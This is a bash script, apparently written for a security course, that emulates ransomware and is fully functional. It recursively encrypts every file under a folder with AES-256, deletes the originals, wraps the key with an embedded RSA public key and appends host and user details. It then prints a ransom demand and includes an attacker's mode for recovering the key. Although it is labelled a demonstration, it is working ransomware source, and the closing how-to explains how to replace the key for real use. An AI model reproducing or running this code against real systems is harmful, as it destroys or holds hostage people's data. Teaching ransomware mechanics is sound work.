#!/bin/bash
#==============================================================================
# This script emulates ransomware activity
#
# It encrypts all files in the current folder and sub-folders
# The randomly generated and encrypted symmetric key is stored in ransom-key.txt
#
# It has modes: encrypt (default), decrypt and attacker's
#
# Usage: $0 [switches] [starting_folder]
#     where optional switches
#          -v  be verbose
#          starting_folder - folder to start encryption/decryption. By default ./
#
# 1) Encrypt the current folder and sub-folders: 
#	./ransom.sh
#
# 2) Send to the attacker the file
#   ransom-key.txt
#
# 3) Get from the attacker the symmetric key (i.e. XwBaVttI6qwwY22t9G2MDQUYX3C0ppQBzZ9/kd5bA48=)
#
# 4) Decrypt the current folder and sub-folders: 
#   ./ransom.sh -d symm_key [starting_folder]
# 
# Attacker's mode (see prep steps at the bottom):
#   ./ransom.sh -e private.key [ransom-key.txt]
#
# It depends on OpenSSL package for operation
# For demonstration purposes only
#
# Updated by Eugene Taylashev on Apr 1, 2020
#------------------------------------------------------------------------------

#==============================================================================
#        Internal vars
#==============================================================================
SELF=$(basename -- "$0")
KEY1=/tmp/ransom1.pem  #-- Attacker's Public key
CRYPT=ransom-key.txt #-- Encrypted key to recover files
VERBOSE=0			#-- 1 - be verbose flag
IS_DEC=0			#-- decrypt flag: 0 - encrypt, 1 - decrypt
TARG="./"			#-- target folder
KEY2="no key"		#-- symmetric key to decrypt
KEY_PRIV="no key"	#-- attacker's private key
IDNT=2

#-- red
rd=$(tput setaf 1)
#-- green
gn=$(tput setaf 2)
#-- yellow
yl=$(tput setaf 3)
#-- blue
bl=$(tput setaf 4)
#-- white
wt=$(tput setaf 7)
#-- white background
bw=$(tput setab 7)
#-- reset
rset=$(tput sgr0)

#-- Attacker's Public key
cat >${KEY1} <<"EOT"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAspY2GaawAxb7NmvTq0dX
XWJMGyVczx/C7uS/yR7ZOIIch0ed+nj+I4ebgp2akqS0Qg5m7ZYoClxD1VyQ4BhE
9Z38TZOv/EyKCYfiO8t20VDPUllUJumAyiPZsXJ2l4A809Zn+oDWSpvrIQ7Bq9Jb
z3QL8f5v+qZ7QuNUXg+H1WqlOiN8EmTJ3GmsdE80Vq7VutZqYeSHVK9i/nPWExTQ
NopBafPMAfl3sNW6mN3HW4jlWqJ8/B3Q9pA32Yz3822KjqMbqKDxf7qL6HQw412y
RSqmpV5SkpPVapYq1o5XpbchF8OhyWnqBXa84wbC49gsSXH4Zj/M41hLjXeROJVb
SQIDAQAB
-----END PUBLIC KEY-----
EOT


#==============================================================================
#         Internal functions 
#==============================================================================

#------------------------------------------------------------------------------
# Encrypt/Decrypt files in the folder and sub-folders using the symmetric key
#------------------------------------------------------------------------------
dir_encrypt0decrypt() {
  cd $1
  fpath=$(pwd)
  [ $VERBOSE -eq 1 ] && echo "Folder $fpath" | pr -T -o $IDNT 
  IDNT=$(( IDNT + 4 ))

  for obj in *; do
	#-- do not process the command file and encrypted key
    if [ "$obj" = "$SELF" ] || [ "$obj" = "$CRYPT" ] ; then
        [ $VERBOSE -eq 1 ] && echo "Skipping $obj" | pr -T -o $IDNT 
	    continue # skip to the next object
	fi

    #-- process sub-folder
	if [ -d $obj ] ; then 
		dir_encrypt0decrypt $obj
	fi

    #-- process file
	if [ -f $obj ] ; then 
	    if [ $IS_DEC -eq 1 ] ; then	#-- Decrypt file
		  res="${obj%.*}"
		  [ $VERBOSE -eq 1 ] && echo "Decrypt $obj -> $res" | pr -T -o $IDNT 
		  openssl aes-256-cbc -d -in $obj -out $res -k $KEY2 -pbkdf2 && rm $obj

		else	#-- Encrypt file
		  [ $VERBOSE -eq 1 ] && echo "Encrypt $obj -> ${obj}.enc" | pr -T -o $IDNT 
		  openssl aes-256-cbc -e -in $obj -out ${obj}.enc -k $KEY2 -pbkdf2 && rm $obj
		fi
	fi
  done
  cd ..
  IDNT=$(( IDNT - 4 ))
} #-- function dir_encrypt0decrypt


#------------------------------------------------------------------------------
# Output text to demand "ransom"
#------------------------------------------------------------------------------
demand_ransom() {
	#-- Source: https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux
    echo "	${rd}${bw}Ooops, your files have been encrypted!${rset}"
    echo "	${bl}${bw}Hope you've attended INFO8600 and INFO8570 courses${rset}"
    echo "	${yl}${bw}To recover your files send the file $CRYPT to the professor${rset}"
    echo "	${bl}${bw}When you will get your key, run: $0 -d the_key${rset}"
	if [ -e $CRYPT ] ; then
	    cat $CRYPT
	fi
} #-- function demand_ransom


#------------------------------------------------------------------------------
#  Output text about the key
#------------------------------------------------------------------------------
no_key_no_decrypt() {
    echo "	${rd}${bw}You need to specify the symmetric key to decrypt your files${rset}"
    echo "	${bl}${bw}Hope you've attended INFO8600 and INFO8570 courses${rset}"
	if [ -e $CRYPT ] ; then
        echo "	${yl}${bw}To recover your files send the file $CRYPT to the professor${rset}"
	    cat $CRYPT
	fi
} #-- function no_key_no_decrypt

#------------------------------------------------------------------------------
#  Output text about missing parts
#------------------------------------------------------------------------------
no_knowledge() {
    echo "	${rd}${bw}Lack of knowledge is detected!${rset}"
    echo "	${bl}${bw}Attend INFO8600 and INFO8570 courses to run this mode${rset}"
}

#==============================================================================
#         MAIN
#==============================================================================
#-- Check input parameters
#-- Source: https://sookocheff.com/post/bash/parsing-bash-script-arguments-with-shopts/
while getopts ":dve" opt; do
  case ${opt} in
    d ) IS_DEC=1 # decrypt flag
      ;;
    v ) VERBOSE=1 # be verbose flag
      ;;
    e ) IS_DEC=13 # attacker's mode
      ;;
  esac
done
shift $((OPTIND -1))

if [[ $# -ge 1 ]] && [[ $IS_DEC -eq 1 ]]; then
	KEY2=$1  #-- symmetric key to decrypt
fi
if [[ $# -ge 1 ]] && [ -d $1 ] ; then
	TARG=$1	#-- target folder
	shift
fi
if [[ $# -ge 1 ]] && [[ $IS_DEC -eq 13 ]]; then
	KEY_PRIV=$1  #-- attacker's private key 
	shift
fi
if [[ $# -ge 1 ]] && [[ $IS_DEC -eq 13 ]]; then
	CRYPT=$1  #-- encrypted symmetric key to decrypt
	shift
fi

#-- Encrypt or Decrypt?
case $IS_DEC in
    #--------------------------------------------------------------------------
    # Decryption mode
    #--------------------------------------------------------------------------
    1 ) 
	
	#-- do we have the key?
	if [ "$KEY2" = "no key" ] ; then
	    no_key_no_decrypt
		exit 13
	fi

	[ $VERBOSE -eq 1 ] && echo "Symmetric key: $KEY2"
	[ $VERBOSE -eq 1 ] && echo "Decrypting folders and sub-folders starting from $TARG"

    #-- Perform folder+files decryption
	dir_encrypt0decrypt $TARG 
      ;;

    #--------------------------------------------------------------------------
    # Attacker's mode. See Documentation at the bottom
    # Decrypt the random symmetric key with the private key
    #--------------------------------------------------------------------------
    13 ) 
	
	#-- do we have the private key?
	[ $VERBOSE -eq 1 ] && echo "Private key: $KEY_PRIV"
	if [ "$KEY_PRIV" = "no key" ] ; then
	    no_knowledge
		exit 13
	fi

	#-- do we have the encrypted file?
	[ $VERBOSE -eq 1 ] && echo "Encrypted key: $CRYPT"
	if ! [ -f $CRYPT ] ; then
	    no_knowledge
		exit 13
	fi

    #-- show additional host info
    sed '2q;d' $CRYPT | base64 -d 
    sed '3q;d' $CRYPT | base64 -d 

    #-- Decrypt the symmetric key with the private key
    sed '1q;d' $CRYPT | base64 -d | openssl rsautl -decrypt -inkey $KEY_PRIV 
      ;;

    #--------------------------------------------------------------------------
    # Encrypt mode
    #--------------------------------------------------------------------------
    * ) 
	[ $VERBOSE -eq 1 ] && echo "Encrypting folders and sub-folders starting from $TARG"

	#-- Generate random symmetric key
	KEY2=$(openssl rand -base64 32)
	[ $VERBOSE -eq 1 ] && echo "Symmetric key: $KEY2"

	#-- Encrypt the symmetric key with the public key
	echo $KEY2 | openssl rsautl -encrypt -pubin -inkey $KEY1 | base64 -w 0 >$CRYPT
	rm $KEY1
	echo "" >>$CRYPT

	#-- add additional info about the host
	uname -a | base64 -w 0 >>$CRYPT
	echo "" >>$CRYPT
	id | base64 -w 0 >>$CRYPT
	echo "" >>$CRYPT

    #-- Send the key to an API
	#==TBD==

    #-- Perform folder+files encryption
	dir_encrypt0decrypt $TARG 

    #-- Demand “ransom”
	demand_ransom
      ;;
esac
#-- Done
exit 0

#==============================================================================
#        How-To / Documentation
#==============================================================================

#------------------------------------------------------------------------------
# Preparation: generate private and public keys  before encryption
#------------------------------------------------------------------------------
#KEY_PRIV=ransom.priv
#KEY_PUB=ransom.pub
##-- Generate the private key
#openssl genrsa -out $KEY_PRIV 2048

##-- Generate the public key
##openssl rsa -in $KEY_PRIV -outform PEM -pubout -out $KEY_PUB

## Replace the public key in this file with one generated by you!

